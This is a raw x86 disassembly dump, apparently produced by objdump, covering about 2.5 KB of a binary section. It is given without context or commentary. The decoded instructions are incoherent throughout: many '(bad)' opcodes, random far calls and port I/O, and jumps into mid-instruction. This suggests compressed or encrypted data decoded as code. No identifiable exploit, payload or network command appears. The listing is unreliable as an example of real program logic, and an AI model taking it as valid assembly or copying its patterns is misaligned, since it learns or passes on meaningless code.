  41c069:	rol    DWORD PTR [ebp+0x42e9377f],0xc2
  41c070:	cli    
  41c071:	push   ebx
  41c072:	dec    ecx
  41c073:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c074:	mov    bl,0xb0
  41c076:	xchg   edx,eax
  41c077:	inc    edi
  41c078:	(bad)  
  41c079:	jmp    0x41c043
  41c07b:	daa    
  41c07c:	fs mov al,0x43
  41c07f:	add    al,0xe5
  41c081:	xlat   BYTE PTR ds:[ebx]
  41c082:	inc    ecx
  41c083:	dec    BYTE PTR [eax]
  41c085:	fxch   st(5)
  41c087:	fsubr  DWORD PTR [edi+ecx*4+0x6d742f6f]
  41c08e:	pop    edx
  41c08f:	adc    BYTE PTR [edx-0x4a40d637],dl
  41c095:	mov    dh,0x8
  41c097:	pop    ebx
  41c098:	std    
  41c099:	pop    ds
  41c09a:	fs jle 0x41c01e
  41c09d:	pop    ds
  41c09e:	pushf  
  41c09f:	cmp    DWORD PTR [edx],esp
  41c0a1:	mov    eax,ebx
  41c0a3:	push   0x2d
  41c0a5:	out    0xe0,eax
  41c0a7:	adc    DWORD PTR [ecx+0x26],edx
  41c0aa:	push   edx
  41c0ab:	sub    cl,BYTE PTR [ecx]
  41c0ad:	push   es
  41c0ae:	repz rcr DWORD PTR [ecx+0x5b637d1e],cl
  41c0b5:	mov    bl,0x51
  41c0b7:	add    DWORD PTR [edx+0x4],ebx
  41c0ba:	cdq    
  41c0bb:	int    0x9f
  41c0bd:	jae    0x41c06b
  41c0bf:	jg     0x41c12d
  41c0c1:	jo     0x41c0b5
  41c0c3:	aaa    
  41c0c4:	lods   al,BYTE PTR ds:[esi]
  41c0c5:	and    DWORD PTR [ebx],ebx
  41c0c7:	loopne 0x41c0d5
  41c0c9:	jp     0x41c12d
  41c0cb:	mov    dh,0x17
  41c0cd:	cdq    
  41c0ce:	pop    ds
  41c0cf:	fiadd  WORD PTR [eax+eax*2-0x4b]
  41c0d3:	test   al,0x6c
  41c0d5:	jg     0x41c08f
  41c0d7:	push   esi
  41c0d8:	fwait
  41c0d9:	cmp    al,0x8f
  41c0db:	mov    bh,0xb8
  41c0dd:	add    DWORD PTR [edx+0x62],esi
  41c0e0:	sub    al,0x29
  41c0e2:	push   ecx
  41c0e3:	sub    ah,BYTE PTR [eax-0x37]
  41c0e6:	jp     0x41c125
  41c0e8:	mov    esp,0xcedd1651
  41c0ed:	push   esp
  41c0ee:	shl    BYTE PTR [edx+ebp*2+0x77fe9dd1],cl
  41c0f5:	leave  
  41c0f6:	ret    0x7ab2
  41c0f9:	jmp    esi
  41c0fb:	xchg   edi,eax
  41c0fc:	lods   eax,DWORD PTR ds:[esi]
  41c0fd:	bound  ebp,QWORD PTR [edi-0x2e]
  41c100:	sub    ch,cl
  41c102:	xchg   esp,eax
  41c103:	dec    ebx
  41c104:	ja     0x41c0b4
  41c106:	sub    edi,DWORD PTR fs:[bx+si-0xa1c]
  41c10c:	add    BYTE PTR [ecx+0xae9d6a],al
	...
  41c172:	add    BYTE PTR [eax],al
  41c174:	(bad)  [edx-0x5f]
  41c177:	clc    
  41c178:	mov    bl,0xfb
  41c17a:	fldcw  WORD PTR [ebx+0x3d]
  41c17d:	add    DWORD PTR ds:0x44a6d8e9,eax
  41c183:	sbb    DWORD PTR [edi+0x500012a],ecx
  41c189:	add    DWORD PTR [eax],eax
  41c18b:	add    BYTE PTR [ecx+0x51],cl
  41c18e:	arpl   WORD PTR [ecx],ax
  41c190:	lock xchg DWORD PTR [ebx+0x5b],esp
  41c194:	rcr    DWORD PTR [edx+0x10369a1e],0xab
  41c19b:	push   cs
  41c19c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c19d:	sub    al,0xaa
  41c19f:	sti    
  41c1a0:	push   edi
  41c1a1:	adc    edi,DWORD PTR [esi-0x5cf1adac]
  41c1a7:	xchg   BYTE PTR [ecx+0x4c1d5455],cl
  41c1ad:	mov    esp,0x8e278261
  41c1b2:	imul   ecx,DWORD PTR [eax-0x74557f99],0xffffffcc
  41c1b9:	xchg   esp,eax
  41c1ba:	and    ch,BYTE PTR [edx-0x2e]
  41c1bd:	mov    esi,0x2bd94d41
  41c1c2:	jb     0x41c1cf
  41c1c4:	sub    ebx,ecx
  41c1c6:	(bad)  
  41c1c7:	loopne 0x41c17c
  41c1c9:	jns    0x41c1c9
  41c1cb:	push   esi
  41c1cc:	add    DWORD PTR [edi],edi
  41c1ce:	xchg   DWORD PTR [edi],edi
  41c1d0:	out    0xf7,al
  41c1d2:	xchg   edx,eax
  41c1d3:	adc    BYTE PTR [ebx+esi*2],0xec
  41c1d7:	ds push es
  41c1d9:	xor    BYTE PTR [ecx],bl
  41c1db:	xor    eax,0x1397d766
  41c1e0:	xchg   ch,bl
  41c1e2:	inc    eax
  41c1e3:	jo     0x41c21d
  41c1e5:	jmp    0x12ee:0xa47071df
  41c1ec:	orps   xmm2,xmm0
  41c1ef:	cmp    al,0x36
  41c1f1:	cdq    
  41c1f2:	lods   al,BYTE PTR ds:[esi]
  41c1f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1f4:	bound  esi,QWORD PTR [eax+0x6f7f95f5]
  41c1fa:	jmp    0xeef5:0x1f28df7a
  41c201:	scas   al,BYTE PTR es:[edi]
  41c202:	pop    edx
  41c203:	mov    BYTE PTR [ebx],dh
  41c205:	adc    al,0xfa
  41c207:	dec    edi
  41c208:	sbb    DWORD PTR [edi],eax
  41c20a:	je     0x41c259
  41c20c:	ins    DWORD PTR es:[edi],dx
  41c20d:	cmp    BYTE PTR ds:0x5480dd49,bh
  41c213:	call   0x753:0xe2767e6b
  41c21a:	test   eax,0x849358ce
  41c21f:	xchg   BYTE PTR [ecx+0x79fb25db],ch
  41c225:	xchg   ecx,eax
  41c226:	jo     0x41c1cb
  41c228:	sub    DWORD PTR [edx-0x30],0x3b
  41c22c:	clc    
  41c22d:	mov    cl,0xc2
  41c22f:	cmp    eax,0xb310fd38
  41c234:	call   0xa1fec239
  41c239:	push   ss
  41c23a:	pop    esi
  41c23b:	out    0x70,eax
  41c23d:	adc    eax,DWORD PTR [eax+0x10]
  41c240:	push   ss
  41c241:	cwde   
  41c242:	push   ds
  41c243:	test   bl,ah
  41c245:	push   cs
  41c246:	mov    esp,?
  41c248:	test   eax,0x741974a2
  41c24d:	into   
  41c24e:	adc    esp,DWORD PTR [eax+ebx*1]
  41c251:	pop    edi
  41c252:	and    edx,DWORD PTR [ecx]
  41c254:	(bad)  
  41c255:	popf   
  41c256:	scas   eax,DWORD PTR es:[edi]
  41c257:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c258:	mov    al,ds:0xbd3c2b0d
  41c25d:	xor    al,0x72
  41c25f:	xor    BYTE PTR [ecx+0x207b2d05],cl
  41c265:	(bad)  
  41c266:	jge    0x41c2ad
  41c268:	repz jl 0x41c278
  41c26b:	je     0x41c291
  41c26d:	xor    al,0xf3
  41c26f:	xchg   edx,eax
  41c270:	ror    DWORD PTR [ecx],cl
  41c272:	rol    BYTE PTR [edx],0x3a
  41c275:	lods   eax,DWORD PTR ds:[esi]
  41c276:	ins    BYTE PTR es:[edi],dx
  41c277:	or     eax,0xcae6c626
  41c27c:	cdq    
  41c27d:	jnp    0x41c2fc
  41c27f:	sti    
  41c280:	sbb    ecx,DWORD PTR [edi-0x2a]
  41c283:	cmp    bh,BYTE PTR [esi-0x2b74c077]
  41c289:	clc    
  41c28a:	jns    0x41c24e
  41c28c:	push   esi
  41c28d:	dec    sp
  41c28f:	adc    esi,edx
	...
  41c2f1:	add    BYTE PTR [eax],al
  41c2f3:	add    bl,dh
  41c2f5:	and    ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	push   ds
  41c301:	or     eax,0x2b94c1a9
  41c306:	add    DWORD PTR [eax],eax
  41c308:	add    eax,0x42000001
  41c30d:	xchg   edi,eax
  41c30e:	ins    DWORD PTR es:[edi],dx
  41c30f:	into   
  41c310:	jl     0x41c30c
  41c312:	mul    DWORD PTR ss:[eax+0x65efe759]
  41c319:	cmp    al,0x5c
  41c31b:	int3   
  41c31c:	mov    dl,0xf1
  41c31e:	test   eax,0xd67cedaa
  41c323:	outs   dx,BYTE PTR ds:[esi]
  41c324:	shl    BYTE PTR [edi],1
  41c326:	je     0x41c32b
  41c328:	jne    0x41c326
  41c32a:	sbb    BYTE PTR [eax+0x69],ch
  41c32d:	or     DWORD PTR ds:0x7bc5552e,edx
  41c333:	fadd   QWORD PTR [ebp+0x18]
  41c336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c337:	pop    ebp
  41c338:	jnp    0x41c30b
  41c33a:	fstp   TBYTE PTR [edi+0x37ad8b57]
  41c340:	outs   dx,BYTE PTR ds:[esi]
  41c341:	cmp    BYTE PTR [edi],dl
  41c343:	push   0x3abf031c
  41c348:	aad    0x65
  41c34a:	jl     0x41c2d7
  41c34c:	repz and eax,ecx
  41c34f:	cmp    bl,dh
  41c351:	jno    0x41c3a3
  41c353:	fidivr DWORD PTR [esi+edx*2]
  41c356:	cs sbb eax,0x6f32e008
  41c35c:	xchg   edx,eax
  41c35d:	dec    esi
  41c35e:	into   
  41c35f:	mov    edi,0xe5d7d8f7
  41c364:	and    BYTE PTR [edx],bl
  41c366:	sbb    al,0x25
  41c368:	cmp    cl,BYTE PTR [esi+0x29a55a9c]
  41c36e:	xchg   edx,eax
  41c36f:	add    eax,0x6975441d
  41c374:	xchg   ebx,eax
  41c375:	lds    esp,FWORD PTR [esi+0x353d4c8e]
  41c37b:	jl     0x41c3e8
  41c37d:	loop   0x41c37a
  41c37f:	sbb    al,0x4a
  41c381:	sub    al,0x96
  41c383:	push   0x19
  41c385:	ret    
  41c386:	out    0x41,al
  41c388:	mov    DWORD PTR [ebx],edi
  41c38a:	dec    edx
  41c38b:	sub    eax,0x89b20f11
  41c390:	mov    esi,0x67e518d3
  41c395:	call   0xa0ee:0xf99cca46
  41c39c:	add    al,0x9d
  41c39e:	lea    ebp,[edx+0x1d]
  41c3a1:	inc    esi
  41c3a2:	mov    esi,0x7ca2b97d
  41c3a7:	sar    BYTE PTR [ebp+0x6f],1
  41c3aa:	mov    ch,0xec
  41c3ac:	lock into 
  41c3ae:	test   eax,0xd9ae6d74
  41c3b3:	push   ecx
  41c3b4:	mov    eax,0x8b4659a8
  41c3b9:	pop    ss
  41c3ba:	push   ss
  41c3bb:	sti    
  41c3bc:	cmp    cl,BYTE PTR [edx+0x24]
  41c3bf:	adc    al,0x2f
  41c3c1:	mov    al,0xaf
  41c3c3:	and    edx,ecx
  41c3c5:	cmp    eax,0x26bcfba7
  41c3ca:	jge    0x41c386
  41c3cc:	inc    esi
  41c3cd:	stc    
  41c3ce:	mov    DWORD PTR [ebx-0x78],ecx
  41c3d1:	mov    bl,0xe0
  41c3d3:	cwde   
  41c3d4:	push   ebx
  41c3d5:	mov    es,WORD PTR [esi+0xd5314db]
  41c3db:	int    0x14
  41c3dd:	xor    bh,BYTE PTR [edi+0x55]
  41c3e0:	call   0x1f8f:0xf839b3cd
  41c3e7:	lea    ebp,[esi+eax*2+0x52]
  41c3eb:	cwde   
  41c3ec:	xor    BYTE PTR [edi],bl
  41c3ee:	xchg   BYTE PTR [edx+0x3c2e566d],al
  41c3f4:	cs cli 
  41c3f6:	adc    BYTE PTR [ecx-0xc],al
  41c3f9:	and    eax,0xf66a520a
  41c3fe:	xchg   ecx,eax
  41c3ff:	push   cs
  41c400:	xlat   BYTE PTR ds:[ebx]
  41c401:	push   eax
  41c402:	icebp  
  41c403:	push   ebp
  41c404:	or     bl,BYTE PTR [esi-0x3d]
  41c407:	sti    
  41c408:	fnstenv [ebp+0x2c]
  41c40b:	adc    edx,DWORD PTR [eax-0xd]
  41c40e:	lea    ecx,[edi+0x31]
	...
  41c474:	push   ebx
  41c475:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	pop    ebp
  41c481:	sbb    dh,ch
  41c483:	lahf   
  41c484:	cdq    
  41c485:	sub    al,0x1
  41c487:	add    BYTE PTR ds:0xfd000001,al
  41c48d:	pusha  
  41c48e:	xor    DWORD PTR [ebp-0x5598988a],esp
  41c494:	and    BYTE PTR [ecx+0x29dd033b],ch
  41c49a:	and    DWORD PTR ds:0x2fea3f2c,0x7e
  41c4a1:	jae    0x41c514
  41c4a3:	xchg   ebx,eax
  41c4a4:	add    BYTE PTR [ebx],bh
  41c4a6:	or     eax,0xc3b5765a
  41c4ab:	pusha  
  41c4ac:	sub    BYTE PTR [eax-0x722894e6],ah
  41c4b2:	mov    dh,0xbf
  41c4b4:	idiv   DWORD PTR [esp+ebx*4]
  41c4b7:	sahf   
  41c4b8:	(bad)  
  41c4b9:	dec    ebx
  41c4ba:	xor    eax,0xb93acd89
  41c4bf:	xor    BYTE PTR [edi+0x40574b0f],bh
  41c4c5:	xor    BYTE PTR [edi+eiz*4],ch
  41c4c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4c9:	dec    edx
  41c4ca:	(bad)  
  41c4cb:	nop
  41c4cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4cd:	aam    0x1a
  41c4cf:	int    0x72
  41c4d1:	inc    esp
  41c4d2:	or     DWORD PTR [edi+0x1a9ce93],ecx
  41c4d8:	mov    ds:0x62457a36,al
  41c4dd:	sbb    ecx,DWORD PTR [ecx+0x25]
  41c4e0:	push   eax
  41c4e1:	or     dl,BYTE PTR [ebp+0x6fd8c0c4]
  41c4e7:	fsubr  DWORD PTR [edi+0x7d]
  41c4ea:	push   edx
  41c4eb:	repnz (bad) 
  41c4ed:	pop    ss
  41c4ee:	xchg   BYTE PTR [esi],bl
  41c4f0:	mov    dh,0x76
  41c4f2:	dec    ebp
  41c4f3:	icebp  
  41c4f4:	jg     0x41c4af
  41c4f6:	fnstcw WORD PTR [edx+0x6a740ed8]
  41c4fc:	nop
  41c4fd:	inc    ecx
  41c4fe:	leave  
  41c4ff:	push   DWORD PTR [edx+0x18575c9]
  41c505:	fcom   st(5)
  41c507:	and    eax,0xf6a19e15
  41c50c:	inc    ecx
  41c50d:	ret    0x9401
  41c510:	inc    ecx
  41c511:	es sahf 
  41c513:	(bad)  
  41c515:	aaa    
  41c516:	inc    ebp
  41c517:	or     BYTE PTR ds:0x94463575,cl
  41c51d:	jle    0x41c4e0
  41c51f:	xlat   BYTE PTR ds:[ebx]
  41c520:	dec    ecx
  41c521:	lods   eax,DWORD PTR ds:[esi]
  41c522:	aam    0x8b
  41c524:	cmc    
  41c525:	mov    ebp,0x89ccfc1e
  41c52a:	scas   al,BYTE PTR es:[edi]
  41c52b:	inc    ebx
  41c52c:	ins    DWORD PTR es:[edi],dx
  41c52d:	jecxz  0x41c539
  41c52f:	adc    BYTE PTR [ecx],0x9f
  41c532:	ret    0x29ac
  41c535:	cmp    BYTE PTR [ecx-0x3d992cdd],ah
  41c53b:	lahf   
  41c53c:	xchg   edx,eax
  41c53d:	mov    bl,0x7a
  41c53f:	pushf  
  41c540:	call   0x5c66:0xb66881ee
  41c547:	mov    esi,0x7a8e678c
  41c54c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c54d:	aaa    
  41c54e:	loope  0x41c5a6
  41c550:	pop    es
  41c551:	loop   0x41c531
  41c553:	dec    eax
  41c554:	fisubr DWORD PTR [ecx]
  41c556:	adc    edx,esi
  41c558:	scas   eax,DWORD PTR es:[edi]
  41c559:	js     0x41c549
  41c55b:	cs test al,0xcc
  41c55e:	scas   eax,DWORD PTR es:[edi]
  41c55f:	mov    ds:0x9b94d92e,al
  41c564:	lahf   
  41c565:	xchg   edx,eax
  41c566:	cmp    eax,0x590989df
  41c56b:	add    eax,0xebb5df71
  41c570:	xor    esi,esp
  41c572:	lock ret 0xcff
  41c576:	pop    ss
  41c577:	outs   dx,BYTE PTR ds:[esi]
  41c578:	leave  
  41c579:	mov    ebx,0xb310ed1c
  41c57e:	hlt    
  41c57f:	loopne 0x41c5d7
  41c581:	inc    ebp
  41c582:	sub    ch,ch
  41c584:	jb     0x41c5a9
  41c586:	test   al,0x5d
  41c588:	ficomp WORD PTR ds:0x5f886c
  41c58e:	imul   ebp,DWORD PTR [esi+0x98],0x0
	...
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d9e:0x618d376e
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    eax,0x23000001
  41c60d:	fisubr DWORD PTR [eax+ecx*4]
  41c610:	add    BYTE PTR [edx+ebp*2],bh
  41c613:	mov    esp,0xa6200076
  41c618:	fcomp  st(5)
  41c61a:	mov    ebp,0x35e60fdf
  41c61f:	push   ss
  41c620:	or     DWORD PTR [ebp+0x47],eax
  41c623:	sub    al,0xb1
  41c625:	push   ss
  41c626:	pop    ecx
  41c627:	jo     0x41c626
  41c629:	stc    
  41c62a:	jmp    0x41c624
  41c62c:	xchg   ebx,eax
  41c62d:	xchg   ebx,eax
  41c62e:	inc    edi
  41c62f:	add    al,0xe2
  41c631:	in     al,0x5a
  41c633:	adc    al,BYTE PTR [esi-0x5de8aa12]
  41c639:	add    BYTE PTR [edx-0x4a],cl
  41c63c:	cmp    dh,BYTE PTR [edx+0x1fa30b6b]
  41c642:	out    0x90,eax
  41c644:	lea    eax,ds:0x7c5067
  41c64a:	lds    esp,FWORD PTR [edx+0x72]
  41c64d:	adc    dh,BYTE PTR [esi+0x71]
  41c650:	mov    dl,0x13
  41c652:	data16 sbb dh,dl
  41c655:	stos   BYTE PTR es:[edi],al
  41c656:	retf   0xdd82
  41c659:	cwde   
  41c65a:	push   0xbef24a60
  41c65f:	push   eax
  41c660:	sbb    ecx,eax
  41c662:	rcl    BYTE PTR [ebx],1
  41c664:	enter  0x87ff,0xb
  41c668:	xchg   esp,eax
  41c669:	and    eax,0xc0a1280d
  41c66e:	inc    ebp
  41c66f:	repnz push 0xffffff8b
  41c672:	stc    
  41c673:	adc    eax,0x4873fdb5
  41c678:	sub    BYTE PTR [ebp+0x3fad7bda],cl
  41c67e:	sbb    BYTE PTR [ecx+0x4],cl
  41c681:	and    BYTE PTR [ebx+0x5a],dl
  41c684:	inc    edx
  41c685:	out    dx,al
  41c686:	dec    edx
  41c687:	and    BYTE PTR [ecx+ebp*4+0x58],cl
  41c68b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c68c:	jbe    0x41c694
  41c68e:	mov    cl,0xf2
  41c690:	std    
  41c691:	xchg   edi,eax
  41c692:	mov    ch,0x70
  41c694:	sti    
  41c695:	and    al,0x52
  41c697:	je     0x41c68d
  41c699:	xor    cl,BYTE PTR [ebx+0x3e]
  41c69c:	les    eax,FWORD PTR ds:0x36caa095
  41c6a2:	push   ds
  41c6a3:	js     0x41c6e4
  41c6a5:	or     al,0x42
  41c6a7:	aas    
  41c6a8:	fwait
  41c6a9:	mov    ds:0x65049b20,eax
  41c6ae:	dec    edi
  41c6af:	ja     0x41c6bd
  41c6b1:	mov    bl,0x9d
  41c6b3:	adc    eax,0xad5b2fb
  41c6b8:	icebp  
  41c6b9:	cmp    BYTE PTR [ecx-0x22],0x32
  41c6bd:	sbb    edi,DWORD PTR [ebx+0x7e017b5c]
  41c6c3:	mov    ah,0x16
  41c6c5:	stos   DWORD PTR es:[edi],eax
  41c6c6:	dec    ecx
  41c6c7:	and    al,0xf6
  41c6c9:	sub    edx,esi
  41c6cb:	retf   0xb72b
  41c6ce:	sahf   
  41c6cf:	jno    0x41c6be
  41c6d1:	sbb    ebp,ebx
  41c6d3:	and    DWORD PTR [edi+eax*4+0x7af8364c],edi
  41c6da:	fbstp  TBYTE PTR [ebp-0x3670cbd4]
  41c6e0:	jecxz  0x41c6a3
  41c6e2:	xor    eax,0xd9619d40
  41c6e7:	jns    0x41c72c
  41c6e9:	mov    ds:0x83351e2d,al
  41c6ee:	jge    0x41c6ec
  41c6f0:	xor    esi,DWORD PTR es:[ecx+0x439d8726]
  41c6f7:	(bad)  
  41c6f8:	xchg   edi,eax
  41c6f9:	jmp    0x41c695
  41c6fb:	nop
  41c6fc:	scas   al,BYTE PTR es:[edi]
  41c6fd:	js     0x41c6fb
  41c6ff:	mov    edx,DWORD PTR ds:0x939072df
  41c705:	lea    ecx,[esi-0x4]
  41c708:	arpl   bx,bx
  41c70a:	fnstenv [ebx-0x14]
  41c70d:	test   al,0x5f
  41c70f:	push   ebx
  41c710:	stos   BYTE PTR es:[edi],al
	...
  41c771:	add    BYTE PTR [eax],al
  41c773:	add    dl,bl
  41c775:	add    edx,eax
  41c777:	xchg   bl,bl
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	pop    esi
  41c781:	xchg   esp,eax
  41c782:	cdq    
  41c783:	dec    ebx
  41c784:	mov    ds:0x500012e,eax
  41c789:	add    DWORD PTR [eax],eax
  41c78b:	add    BYTE PTR [ebx],al
  41c78d:	cmc    
  41c78e:	jbe    0x41c77d
  41c790:	cwde   
  41c791:	rol    ah,cl
  41c793:	mov    ds:0x3e926487,al
  41c798:	mov    esi,DWORD PTR [esi-0x59]
  41c79b:	out    dx,eax
  41c79c:	sub    DWORD PTR [ebx],edx
  41c79e:	push   ecx
  41c79f:	or     bh,dl
  41c7a1:	mov    ebx,0x18165261
  41c7a6:	loopne 0x41c7c9
  41c7a8:	push   esi
  41c7a9:	rcl    BYTE PTR [ebx],1
  41c7ab:	lock add al,0xe7
  41c7ae:	retf   
  41c7af:	icebp  
  41c7b0:	(bad)  
  41c7b1:	loopne 0x41c758
  41c7b3:	sbb    al,0xec
  41c7b5:	stos   BYTE PTR es:[edi],al
  41c7b6:	dec    ebx
  41c7b7:	outs   dx,DWORD PTR ds:[esi]
  41c7b8:	push   esp
  41c7b9:	sbb    BYTE PTR [eax+0xf],cl
  41c7bc:	(bad)  [ebp-0x17]
  41c7bf:	fimul  DWORD PTR [edx]
  41c7c1:	cli    
  41c7c2:	in     eax,dx
  41c7c3:	call   0xb312:0xe4e2a4a7
  41c7ca:	das    
  41c7cb:	fs popf 
  41c7cd:	push   esi
  41c7ce:	mov    ebx,0xfea49b76
  41c7d3:	ret    
  41c7d4:	push   esi
  41c7d5:	inc    ebp
  41c7d6:	mov    esp,0xe476069c
  41c7db:	sbb    ebp,DWORD PTR [eax-0x51]
  41c7de:	add    DWORD PTR [ebx-0x69],edi
  41c7e1:	cmp    al,0x56
  41c7e3:	ret    
  41c7e4:	lock mov ebx,0x448fdd34
  41c7ea:	daa    
  41c7eb:	(bad)  
  41c7ec:	(bad)  [ebx-0x6b2fddc4]
  41c7f2:	shl    DWORD PTR [ebx],1
  41c7f4:	add    eax,DWORD PTR [ecx]
  41c7f6:	test   eax,0x11198d50
  41c7fb:	in     al,dx
  41c7fc:	int    0x6b
  41c7fe:	(bad)  
  41c7ff:	lds    eax,FWORD PTR [ecx-0x211a9497]
  41c805:	bsf    eax,DWORD PTR [esi+esi*2]
  41c809:	dec    edi
  41c80a:	xchg   edi,eax
  41c80b:	int    0xdb
  41c80d:	push   esi
  41c80e:	aas    
  41c80f:	imul   edi,ecx,0xf1debbb1
  41c815:	sbb    DWORD PTR [ebp+0xa],eax
  41c818:	or     esi,eax
  41c81a:	and    BYTE PTR [ebx-0x6e1c60bf],bh
  41c820:	sub    ch,BYTE PTR [ebx-0x27]
  41c823:	adc    ebx,edx
  41c825:	fld    QWORD PTR [esi-0x16d6c2d]
  41c82b:	cmp    eax,0x30a9343c
  41c830:	popa   
  41c831:	mov    eax,0xb86fe354
  41c836:	and    al,0xae
  41c838:	int    0xcb
  41c83a:	add    ebp,ebp
  41c83c:	pop    ebx
  41c83d:	mov    ds:0xd31aef9,al
  41c842:	sub    BYTE PTR [ebx],bh
  41c844:	cdq    
  41c845:	mov    ebp,0x1ce9425b
  41c84a:	xor    BYTE PTR [ebx+0x54],al
  41c84d:	xor    ebx,0x32ef130a
  41c853:	iret   
  41c854:	mov    al,dl
  41c856:	cs fsubrp st(6),st
  41c859:	cwde   
  41c85a:	sub    al,0xc
  41c85c:	jne    0x41c891
  41c85e:	imul   ecx,DWORD PTR [ecx],0x77
  41c861:	mov    cl,0xfa
  41c863:	loopne 0x41c8a2
  41c865:	fisub  WORD PTR [eax]
  41c867:	inc    eax
  41c868:	mov    bl,0xde
  41c86a:	mov    WORD PTR [esi],fs
  41c86c:	xchg   edi,eax
  41c86d:	cmp    al,0xe5
  41c86f:	ds inc ecx
  41c871:	mov    eax,ds:0x81ea31c7
  41c876:	ret    0xadcb
  41c879:	fs jmp 0x41c85c
  41c87c:	mov    dh,0x4e
  41c87e:	enter  0x577d,0xdd
  41c882:	add    ecx,ecx
  41c884:	leave  
  41c885:	dec    esp
  41c886:	xor    al,0xbe
  41c888:	out    0x67,al
  41c88a:	fmul   QWORD PTR [ebp+0x40a1cec6]
  41c890:	in     eax,dx
	...
  41c8f1:	add    BYTE PTR [eax],al
  41c8f3:	add    BYTE PTR [ebx+0x34],ah
  41c8f6:	lods   eax,DWORD PTR ds:[esi]
  41c8f7:	xor    al,0xff
  41c8f9:	mov    ebp,0x291877fb
  41c8fe:	cmp    eax,DWORD PTR [ecx]
  41c900:	push   esp
  41c901:	jecxz  0x41c8ec
  41c903:	jnp    0x41c8ad
  41c905:	das    
  41c906:	add    DWORD PTR [eax],eax
  41c908:	add    eax,0x35000001
  41c90d:	stos   DWORD PTR es:[edi],eax
  41c90e:	retf   0x7232
  41c911:	lock out 0xd3,al
  41c914:	push   ss
  41c915:	sti    
  41c916:	pop    ds
  41c917:	adc    DWORD PTR [esi+eax*1+0x6908fc46],eax
  41c91e:	jns    0x41c922
  41c920:	jmp    0x41c984
  41c922:	shl    bl,0xbb
  41c925:	test   al,0x7
  41c927:	(bad)  
  41c928:	hlt    
  41c929:	adc    al,0xcf
  41c92b:	pop    sp
  41c92d:	xchg   ecx,eax
  41c92e:	lods   al,BYTE PTR ds:[esi]
  41c92f:	test   BYTE PTR [eax-0x1ff0e3d6],cl
  41c935:	test   BYTE PTR [ebp+0x43eb870d],dh
  41c93b:	(bad)  
  41c93d:	jbe    0x41c8f2
  41c93f:	and    al,0x2b
  41c941:	fisttp QWORD PTR [esp+eiz*2]
  41c944:	(bad)  
  41c945:	jmp    0x41c99f
  41c947:	adc    eax,0x6b087e57
  41c94c:	xlat   BYTE PTR ds:[ebx]
  41c94d:	jmp    0x9571070b
  41c952:	and    esi,DWORD PTR [esi-0x45cfcf4b]
  41c958:	add    ah,0xf4
  41c95b:	dec    esp
  41c95c:	add    eax,0xe8118886
  41c961:	shl    BYTE PTR [ebx-0x1d],cl
  41c964:	in     eax,0xbd
  41c966:	mov    edi,0x57d31d42
  41c96b:	popa   
  41c96c:	mov    bl,0x2b
  41c96e:	xchg   ebp,eax
  41c96f:	pop    ebp
  41c970:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c971:	push   eax
  41c972:	out    0xc6,eax
  41c974:	fstp   DWORD PTR [ecx-0x10fd7a1c]
  41c97a:	mov    eax,0xd7c12c50
  41c97f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c980:	or     eax,0x658f937
  41c985:	or     BYTE PTR [edx-0x424263d2],cl
  41c98b:	mov    al,ds:0x396f2b79
  41c990:	jle    0x41c9bc
  41c992:	test   DWORD PTR [edx+edx*8-0x53],eax
  41c996:	sub    BYTE PTR [ebx-0x313d560],al
  41c99c:	outs   dx,DWORD PTR ds:[esi]
  41c99d:	and    DWORD PTR [eax+esi*8-0x38],ebx
  41c9a1:	fcomp  QWORD PTR [edi+0x3188e2f0]
  41c9a7:	xchg   ebx,eax
  41c9a8:	mov    ah,0x7d
  41c9aa:	cmp    DWORD PTR ds:0xac1358b1,0x39
  41c9b1:	ja     0x41c9fa
  41c9b3:	(bad)
  41c9b8:	dec    esi
  41c9b9:	sub    al,0xb1
  41c9bb:	mov    edx,0xcec01df0
  41c9c0:	add    al,0xf0
  41c9c2:	data16 mov cl,0x38
  41c9c5:	adc    al,0x48
  41c9c7:	jl     0x41c967
  41c9c9:	jecxz  0x41ca13
  41c9cb:	mov    ds,WORD PTR [edi]
  41c9cd:	ja     0x41c9f0
  41c9cf:	xchg   esp,eax
  41c9d0:	pop    eax
  41c9d1:	es xor cl,bh
  41c9d4:	je     0x41ca4e
  41c9d6:	or     eax,0x2278deb
  41c9db:	aad    0xca
  41c9dd:	(bad)  
  41c9de:	bound  edi,QWORD PTR [ebx+0x52dca4c4]
  41c9e4:	jg     0x41ca5c
  41c9e6:	repz out 0x41,al
  41c9e9:	adc    bl,BYTE PTR [edi+0x39]
  41c9ec:	inc    ebx
  41c9ed:	mov    bh,0x73
  41c9ef:	add    cl,ch
  41c9f1:	sub    edx,ebx
  41c9f3:	ds mov ebp,0x6479e04a
  41c9f9:	and    eax,0x298fb600
  41c9fe:	loop   0x41c9b5
  41ca00:	xor    al,0xf4
  41ca02:	jnp    0x41ca0f
  41ca04:	into   
  41ca05:	add    ebx,DWORD PTR [eax]
  41ca07:	sbb    DWORD PTR [edi],ebx
  41ca09:	adc    esi,DWORD PTR [eax]
  41ca0b:	mov    dh,0x92
  41ca0d:	xor    ch,ah
  41ca0f:	or     DWORD PTR ds:[eax],eax
	...
